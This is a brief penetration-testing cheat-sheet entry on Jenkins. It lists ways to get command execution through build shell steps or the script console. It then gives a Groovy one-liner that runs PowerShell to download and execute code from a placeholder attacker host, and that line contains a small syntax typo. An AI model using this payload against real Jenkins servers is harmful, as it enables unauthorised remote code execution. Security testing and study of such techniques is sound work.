# Jenkins

> Jenkins is a free and open source automation server. Jenkins helps to automate the non-human part of the software development process, with continuous integration and facilitating technical aspects of continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.  

## Command execution

1. create new project
2. build -> execute shell

or

1. manage jenkins
2. script console

```groovy
cmd = """ powershell "IEX(NewObject Net.WebClient).downloadString('http://<ip>/file')" """
println cmd.execute().text
```
